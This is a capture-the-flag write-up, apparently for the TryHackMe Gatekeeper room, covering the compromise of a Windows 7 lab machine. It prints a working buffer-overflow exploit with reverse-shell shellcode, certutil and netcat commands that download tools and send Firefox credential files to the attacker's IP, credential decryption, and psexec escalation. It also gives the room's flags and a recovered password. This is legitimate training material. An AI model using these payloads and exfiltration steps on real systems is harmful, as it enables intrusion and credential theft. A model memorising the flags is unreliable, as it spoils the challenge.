

## Enumeration

#### nmap port scanning

```
Nmap scan report for 10.10.25.76
Host is up (0.11s latency).
Not shown: 990 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=gatekeeper
| Not valid before: 2021-11-20T18:46:45
|_Not valid after:  2022-05-22T18:46:45
|_ssl-date: 2021-11-21T19:08:25+00:00; -1s from scanner time.
31337/tcp open  Elite?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49161/tcp open  msrpc              Microsoft Windows RPC

Network Distance: 2 hops
Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h14m59s, deviation: 2h30m00s, median: -1s
|_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: <unknown>, NetBIOS MAC: 02:7d:b2:2b:e9:09 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: gatekeeper
|   NetBIOS computer name: GATEKEEPER\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-11-21T14:08:19-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-11-21T19:08:19
|_  start_date: 2021-11-21T18:46:01

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 225.99 seconds

```

so we see a wried port ```31337``` and some smb ports ```445```
lets connect to smb to look if there any share files using smbclient

```
smbclient -L 10.10.25.76
```
```
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Users           Disk      
SMB1 disabled -- no workgroup available

```
we have a public directory, let's see what we can find in
```
smbclient //10.10.25.76/Users

Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Thu May 14 21:57:08 2020
  ..                                 DR        0  Thu May 14 21:57:08 2020
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Share                               D        0  Thu May 14 21:58:07 2020

smb: \> cd share
smb: \share\> dir
  .                                   D        0  Thu May 14 21:58:07 2020
  ..                                  D        0  Thu May 14 21:58:07 2020
  gatekeeper.exe                      A    13312  Mon Apr 20 01:27:17 2020

smb: \share\> get gatekeeper.exe
getting file \share\gatekeeper.exe of size 13312 as gatekeeper.exe (27.8 KiloBytes/sec) (average 27.8 KiloBytes/sec)
smb: \share\> 
```
after downloading ```gatekeeper.exe``` I discovered that's the program who run on the port ```31337```
let's fuzz this program for exploit it.
I used this python script for this
```python
#!/usr/bin/python
import sys
import socket
from time import sleep


ip = "192.168.43.50" # this my windows lab ip
port = 31337 # the application targeted port
buffer = 'A' * 50 # bufer

while True:

	
	try:

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip, port))

		s.send((buffer+'\r\n')) # send the buffer over the tcp connection
		s.close()
		sleep(1)
		buffer = buffer + 'A' * 50

	except:
		print "fuzzing crashed at %s bytes" % str(len(buffer)) # tell the attacker where the application crashed
		sys.exit()

```
run the program in you lab thin run this script in you kali.. we have the overflow size now ```159```

### note

in these writeup I will note go over all usal steps of the buffer overflow steps, instead of this I will recomond for you [bufferoverflow tryhackme preparation room](https://tryhackme.com/room/bufferoverflowprep), it's good manual for you if you are a beginer in this topic

so after all usal steps the results are:
```
bad characters \x00\x0A
```
```
JMP ESP 0x080414c3 
JMP ESP 0x080416bf
```

now let's geanarate a shellcode using the msfvenom
```
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -b "\x00\x0A" -f c -e x86/shikata_ga_nai
```
the final exploit it's
```python

import socket
import sys
from time import sleep



#bad characters \x00\x0A

# shellcode
# msfvenom -p windows/shell_reverse_tcp LHOST=10.9.3.214 LPORT=4444 -b "\x00\x0A" -f c -e x86/shikata_ga_nai

shell = ("\xda\xc3\xbe\xa4\xa4\xd2\x98\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x31\x70\x17\x83\xe8\xfc\x03\xd4\xb7\x30\x6d\xe8\x50\x36"
"\x8e\x10\xa1\x57\x06\xf5\x90\x57\x7c\x7e\x82\x67\xf6\xd2\x2f"
"\x03\x5a\xc6\xa4\x61\x73\xe9\x0d\xcf\xa5\xc4\x8e\x7c\x95\x47"
"\x0d\x7f\xca\xa7\x2c\xb0\x1f\xa6\x69\xad\xd2\xfa\x22\xb9\x41"
"\xea\x47\xf7\x59\x81\x14\x19\xda\x76\xec\x18\xcb\x29\x66\x43"
"\xcb\xc8\xab\xff\x42\xd2\xa8\x3a\x1c\x69\x1a\xb0\x9f\xbb\x52"
"\x39\x33\x82\x5a\xc8\x4d\xc3\x5d\x33\x38\x3d\x9e\xce\x3b\xfa"
"\xdc\x14\xc9\x18\x46\xde\x69\xc4\x76\x33\xef\x8f\x75\xf8\x7b"
"\xd7\x99\xff\xa8\x6c\xa5\x74\x4f\xa2\x2f\xce\x74\x66\x6b\x94"
"\x15\x3f\xd1\x7b\x29\x5f\xba\x24\x8f\x14\x57\x30\xa2\x77\x30"
"\xf5\x8f\x87\xc0\x91\x98\xf4\xf2\x3e\x33\x92\xbe\xb7\x9d\x65"
"\xc0\xed\x5a\xf9\x3f\x0e\x9b\xd0\xfb\x5a\xcb\x4a\x2d\xe3\x80"
"\x8a\xd2\x36\x06\xda\x7c\xe9\xe7\x8a\x3c\x59\x80\xc0\xb2\x86"
"\xb0\xeb\x18\xaf\x5b\x16\xcb\xda\x92\x1b\xdd\xb3\xa6\x1b\xf0"
"\x1f\x2e\xfd\x98\x8f\x66\x56\x35\x29\x23\x2c\xa4\xb6\xf9\x49"
"\xe6\x3d\x0e\xae\xa9\xb5\x7b\xbc\x5e\x36\x36\x9e\xc9\x49\xec"
"\xb6\x96\xd8\x6b\x46\xd0\xc0\x23\x11\xb5\x37\x3a\xf7\x2b\x61"
"\x94\xe5\xb1\xf7\xdf\xad\x6d\xc4\xde\x2c\xe3\x70\xc5\x3e\x3d"
"\x78\x41\x6a\x91\x2f\x1f\xc4\x57\x86\xd1\xbe\x01\x75\xb8\x56"
"\xd7\xb5\x7b\x20\xd8\x93\x0d\xcc\x69\x4a\x48\xf3\x46\x1a\x5c"
"\x8c\xba\xba\xa3\x47\x7f\xca\xe9\xc5\xd6\x43\xb4\x9c\x6a\x0e"
"\x47\x4b\xa8\x37\xc4\x79\x51\xcc\xd4\x08\x54\x88\x52\xe1\x24"
"\x81\x36\x05\x9a\xa2\x12")


#JMP ESP 0x080414c3 
#JMP ESP 0x080416bf


string = 'A'*146 + "\xBF\x16\x04\x08" + "\x90"*16 + shell

host = '10.10.25.76'
ip = 31337

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host,ip))
	print "sending evil payload"
	s.send(string+"\r\n")
	data = s.recv(1024)
	print("Done!")
	s.close()

except:
	print "error"
	sys.exit()
```
run the exploit after running the listener with
```
nc -nlvp 4444
```
```
┌──(root💀kali)-[/home/kali]
└─# nc -nlvp 4444                 
listening on [any] 4444 ...
connect to [10.9.3.214] from (UNKNOWN) [10.10.25.76] 49180
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\natbat\Desktop>
```
and boom.. we have now a reverse shell

## user.txt
```
┌──(root💀kali)-[/home/kali]
└─# nc -nlvp 4444                 
listening on [any] 4444 ...
connect to [10.9.3.214] from (UNKNOWN) [10.10.25.76] 49180
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\natbat\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of C:\Users\natbat\Desktop

05/14/2020  08:24 PM    <DIR>          .
05/14/2020  08:24 PM    <DIR>          ..
04/21/2020  04:00 PM             1,197 Firefox.lnk
04/20/2020  12:27 AM            13,312 gatekeeper.exe
04/21/2020  08:53 PM               135 gatekeeperstart.bat
05/14/2020  08:43 PM               140 user.txt.txt
               4 File(s)         14,784 bytes
               2 Dir(s)  16,290,902,016 bytes free

C:\Users\natbat\Desktop>more user.txt.txt
more user.txt.txt
{H4lf_W4y_Th3r3}

The buffer overflow in this room is credited to Justin Steven and his 
"dostackbufferoverflowgood" program.  Thank you!

C:\Users\natbat\Desktop>

```
# privilege escalation
now we arrived to the hardest job in this windows machine
if we returned back to the desktop files we will notice ```firefox.lnk```
```
Directory of C:\Users\natbat\Desktop

05/14/2020  08:24 PM    <DIR>          .
05/14/2020  08:24 PM    <DIR>          ..
04/21/2020  04:00 PM             1,197 Firefox.lnk
04/20/2020  12:27 AM            13,312 gatekeeper.exe
04/21/2020  08:53 PM               135 gatekeeperstart.bat
05/14/2020  08:43 PM               140 user.txt.txt
               4 File(s)         14,784 bytes
               2 Dir(s)  16,290,902,016 bytes free
```
Retrieving credentials from browser caches is a well known path for prrev escalation, there is a known path in the windows files that sort firefox browser caches a quick google search you well find this path
```
C:\Users\{user}\AppData\Roaming\Mozilla\Firefox\Profiles\
```
in our case the user it's natbat
```
C:\Users\natbat\Desktop>cd C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\
cd C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\

C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles

04/21/2020  04:00 PM    <DIR>          .
04/21/2020  04:00 PM    <DIR>          ..
05/14/2020  09:45 PM    <DIR>          ljfn812a.default-release
04/21/2020  04:00 PM    <DIR>          rajfzh3y.default
               0 File(s)              0 bytes
               4 Dir(s)  16,192,217,088 bytes free
```
if you notice there is a directory called ```ljfn812a.default-release``` serach about on google you will find this folder save the browser logins
let's see what this folder content
```
05/14/2020  09:45 PM    <DIR>          .
05/14/2020  09:45 PM    <DIR>          ..
05/14/2020  09:30 PM                24 addons.json
05/14/2020  09:23 PM             1,952 addonStartup.json.lz4
05/14/2020  09:45 PM                 0 AlternateServices.txt
05/14/2020  09:30 PM    <DIR>          bookmarkbackups
05/14/2020  09:24 PM               216 broadcast-listeners.json
04/21/2020  11:47 PM           229,376 cert9.db
04/21/2020  04:00 PM               220 compatibility.ini
...
snip
...
```
ther is an important files that maight be contain logins
```key4.db``` and ```logins.json```. for Retrieving the passwords from those files there a good python script for that, read ![this](https://github.com/lclevy/firepwd).
```
┌──(root💀kali)-[/home/kali/Desktop/rooms/gatekeeper]
└─# git clone https://github.com/lclevy/firepwd.git
...
snip
...
```
let's send ```key4.db``` and ```logins.json``` to our kali.
we have to find a way for transering files between our kali and the target windows machine first.
the best one it's netcat, but we have to download netcat windows version first on our kali then transfer it to the windows machine
```
┌──(root💀kali)-[/home/kali/Desktop/rooms/gatekeeper]
└─# wget https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip
--2021-11-22 10:22:16--  https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip
Resolving eternallybored.org (eternallybored.org)... 84.255.206.8, 2a01:260:4094:1:42:42:42:42
Connecting to eternallybored.org (eternallybored.org)|84.255.206.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 111892 (109K) [application/zip]
Saving to: ‘netcat-win32-1.12.zip.1’

netcat-win32-1.12. 100%[=============>] 109.27K   392KB/s    in 0.3s    

2021-11-22 10:22:18 (392 KB/s) - ‘netcat-win32-1.12.zip.1’ saved [111892/111892]
```
```
┌──(root💀kali)-[/home/kali/Desktop/rooms/gatekeeper]
└─# unzip netcat-win32-1.12.zip
	nc.exe
	nc64.exe
	...
	snip
	...
```
now, let's transfer nc.txt to the windows machine, run the local simple http server with python
```
python3 -m http.server
```
search for a usefull tool comes with windows by default called ```CertUtil``` One of the features of CertUtil is the ability to download a certificate, or any other file for that matter, from a remote URL and save it as a local file. we can get nc.exe from our kali to the windows using the syntax 
```
certutil -urlcache -f http://10.9.3.214:8000/nc.exe nc.exe
```
now we have netcat in the windows target, let's use it on our shell for get key4.db and logins.json
##### kali
```
nc -nlvp 1234 > logins.json
```
##### windows shell
```
nc.exe -nv 10.9.3.214 1234 < logins.json
```
do the same with key4.db file.
now we have thowse two files we can retrieve all possible credentials from them to escalate our privilege.

now move them to firepwd/
```
mv logins.json firepwd/
```
```
mv key4.db firepwd/
```
let's get thowse fucking credentials using firepwd script

```
┌──(root💀kali)-[/home/kali/Desktop/rooms/gatekeeper]
└─# cd firepwd/                                                        1 ⨯
                                                                           
┌──(root💀kali)-[/home/…/Desktop/rooms/gatekeeper/firepwd]
└─# pip install -r requirements.txt
	...
	snip
	...
```
run the script
```
┌──(root💀kali)-[/home/…/Desktop/rooms/gatekeeper/firepwd]
└─# python3 firepwd.py 
	...
	snip
	...

clearText b'86a15457f119f862f8296e4f2f6b97d9b6b6e9cb7a3204760808080808080808'
decrypting login/password pairs
   https://creds.com:b'mayor',b'8CL7O1N78MdrCIsV'

```
Excellent, now we have some creds, let's use them with ```psexec```
PSExec: This tool can execute any command on the remote system, including interactive commands such as cmd.exe or powershell.exe
```
python3 /usr/share/doc/python3-impacket/examples/psexec.py gatekeeper/mayor:8CL7O1N78MdrCIsV@10.10.25.76 cmd.exe
```
```
┌──(root💀kali)-[/home/kali]
└─# python3 /usr/share/doc/python3-impacket/examples/psexec.py gatekeeper/mayor:8CL7O1N78MdrCIsV@10.10.25.76 cmd.exe
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.25.76.....
[*] Found writable share ADMIN$
[*] Uploading file IYZpHtGi.exe
[*] Opening SVCManager on 10.10.25.76.....
[*] Creating service KSiY on 10.10.25.76.....
[*] Starting service KSiY.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>

```
boom...! we are the Administrator now
![gif](https://hamza07-w.github.io/portfolio/img/wr/spacebox/noice.gif)
## root.txt
```
C:\Windows\system32>cd c:\users\mayor\desktop
 
c:\Users\mayor\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of c:\Users\mayor\Desktop

05/14/2020  08:58 PM    <DIR>          .
05/14/2020  08:58 PM    <DIR>          ..
05/14/2020  08:21 PM                27 root.txt.txt
               1 File(s)             27 bytes
               2 Dir(s)  16,295,755,776 bytes free

c:\Users\mayor\Desktop>more root.txt.txt
{Th3_M4y0r_C0ngr4tul4t3s_U}

c:\Users\mayor\Desktop>

```
